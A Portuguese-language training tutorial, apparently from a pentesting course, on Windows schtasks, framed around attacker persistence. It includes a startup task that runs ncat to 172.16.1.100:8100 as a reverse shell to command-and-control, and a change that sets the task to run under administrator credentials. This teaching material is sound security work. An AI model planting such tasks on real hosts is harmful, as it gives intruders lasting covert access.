
As tarefas agendadas são uma excelente maneira de os administradores garantirem que as tarefas que desejam executar regularmente aconteçam, mas também são um excelente ponto de persistência para invasores. Iremos discutir o uso de schtasks:

- Como checar quais tasks existem
- Como criar uma nova task para ajudar a automatizar ações ou adquirir uma shell no host


# O que são scheduled tasks?

O Task Scheduler permite que nós, como administradores, executemos tasks de rotina sem precisar iniciá-las manualmente. O scheduler monitorará o host em busca de um conjunto específico de condições chamado triggers(gatilhos) e executará a task assim que as condições forem atendidas.

Hora da história: Em vários compromissos, enquanto fazia pentesting em um ambiente corporativo, estive em uma posição em que cheguei a um host e precisava de uma maneira rápida de definir a persistência. Em vez de fazer algo maluco ou baixar outro executável no host, decidi procurar ou criar uma tarefa agendada que seja executada quando um usuário fizer login ou o host for reinicializado. Nessa tarefa agendada, definiria um gatilho para abrir um novo socket utilizando o PowerShell, acessando minha infraestrutura de Comando e Controle. Isso garantiria que eu pudesse voltar se perdesse o acesso a este host. Se eu tivesse sorte, quando a tarefa que escolhi fosse executada, também poderia receber um shell de nível SYSTEM de volta, elevando meus privilégios ao mesmo tempo. Ele garantiu rapidamente o acesso ao host sem disparar alarmes com antivírus ou sistemas de prevenção contra perda de dados.

## Triggers que podem iniciar uma scheduled task

- Quando um evento especifico no sistema ocorre
- Em um horário específico
- Em um horário específico em um programação diária
- Em um horário específico em uma programação semanal
- Em um horário específico em uma programação mensal
- Em um horário específico em uma programação mensal de um dia da semana
- Quando o computador entra em um estado ocioso
- Quando a task é registrada
- Quando o sistema é inicializado
- Quando um usuário faz logon
- Quando uma sessão do Terminal Server muda de estado

Essa lista de triggers é extensa e nos dá muitas opções para que uma tarefa execute uma ação. Agora que sabemos o que são tarefas agendadas e o que pode torná-las acionáveis, é hora de começar a usá-las.

# Como utilizar schtasks

## Mostrar scheduled tasks

#### Ação: Query - Parâmetros
- /fo: seta a opção de formatação, podemos especificar para mostrar os resultados em formato de tabela, lista ou csv.
- /v: Seta o formato verboso, mostrando um conjunto de propriedades avançadas quando usado com o formato de output como lista ou csv.
- /nh: Simplifica o output usando o formato de output de tabela ou csv. Essa opção remove a coluna de cabeçalho.
- /s: Seta o DNS ou endereço IP do host que nós queremos conectar. Localhost é a opção default especificada. Se /s é utilizada, nós estamos conectando em um host remoto e o formato é : `\\host`
- /u: Essa opção informará para ao schtasks para rodar o seguinte comando com o conjunto de permissões do usuário especificado.
- /p: Define a senha em uso para execução do comando quando especificamos um usuário para execução. Os usuários devem ser membros do grupo do administrador no host (ou domínio). Os valores u e p são válidos apenas quando usados com o parâmetro /s.

```cmd-session
C:\htb> SCHTASKS /Query /V /FO list

Folder: \  
HostName:                             DESKTOP-Victim
TaskName:                             \Check Network Access
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive only
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               DESKTOP-Victim\htb-admin
Task To Run:                          C:\Windows\System32\cmd.exe ping 8.8.8.8
Start In:                             N/A
Comment:                              quick ping check to determine connectivity. If it passes, other tasks will kick off. If it fails, they will delay.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          tru7h
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

<SNIP>
```

## Criar uma scheduled task

### Ação: Criar - Parâmetros

- /sc: Define o tipo de agendamento. Pode ser por minuto, por hora, semanalmente e muito mais. Certifique-se de verificar os parâmetros das opções.
- /tn: Define o nome da tarefa que estamos construindo. Cada tarefa deve ter um nome exclusivo.
- /tr: Define o gatilho e a tarefa que devem ser executados. Pode ser um executável, script ou arquivo em lote.
- /s: Especifica o host a rodar, como explicado em Query.
- /u: Especifica o usuário local ou usuário do dominio para utilizar.
- /p: Seta a senha do usuário especificado
- /mo: Nos permite definir um modificador para ser executado dentro de nosso cronograma definido. Por exemplo, a cada 5 horas em dias alternados.
- /rl: Permite limitar os privilégios da tarefa. As opções aqui são acesso limited e highest, sendo limited o valor padrão.
- /z: Irá definir a tarefa a ser excluída após a conclusão de suas ações.

```cmd-session
C:\htb> schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"

SUCCESS: The scheduled task "My Secret Task" has successfully been created.
```


Um ótimo exemplo de uso para schtasks seria nos fornecer um retorno de chamada toda vez que o host for inicializado. Isso garantiria que, se nosso shell morrer, receberemos um retorno de chamada do host na próxima vez que ocorrer uma reinicialização, tornando provável que só perderemos o acesso ao host por um curto período de tempo se algo acontecer ou o host for desligado. Podemos criar ou modificar uma nova tarefa adicionando um novo gatilho e ação. Em nossa tarefa acima, temos schtasks executando o Ncat localmente, que colocamos no diretório AppData do usuário e conectando ao host `172.16.1.100` na porta `8100`. Se executada com sucesso, esta solicitação de conexão deve se conectar ao nosso framework de comando e controle (Metasploit, Empire, etc.) e nos dar acesso ao shell.

## Alterando as propriedades de uma scheduled task

### Ação: Change - Parâmetros

- /tn: Designa a task a ser alterada
- /tr: Modifica o programa ou ação que a task executa.
- /ENABLE: Altera o estado da task para Enabled.
- /DISABLE: Altera o estado da task para Disabled.

Digamos que encontramos o hash da senha do administrador local e queremos usá-lo para genrar nosso shell Ncat para nós; se algo acontecer, podemos modificar a tarefa para adicionar as credencias a serem usadas.

```cmd-session
C:\htb> schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"

SUCCESS: The parameters of scheduled task "My Secret Task" have been changed.
```

```cmd-session
C:\htb> schtasks /query /tn "My Secret Task" /V /fo list 

Folder: \
HostName:                             DESKTOP-Victim
TaskName:                             \My Secret Task
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               DESKTOP-victim\htb-admin
Task To Run:                          C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up

<SNIP>  
```

## Deletar scheduled tasks

### Ação: Delete - Parâmetros:

- /tn: Identifica a task para deletar.
- /s: Especifica o nome ou endereço IP do qual deletar a task.
- /u: Especifica o usuário para executar a tarefa.
- /p: Especifica a senha para executar a tarefa.
- /t: Para o aviso de confirmação.

```cmd-session
C:\htb> schtasks /delete  /tn "My Secret Task" 

WARNING: Are you sure you want to remove the task "My Secret Task" (Y/N)?
```

A execução de schtasks /delete é bastante simples. O que deve ser observado é que, se não fornecermos a opção /F, seremos solicitados, como no exemplo acima, a fornecer a entrada. Usar /F excluirá a tarefa e suprimirá a mensagem.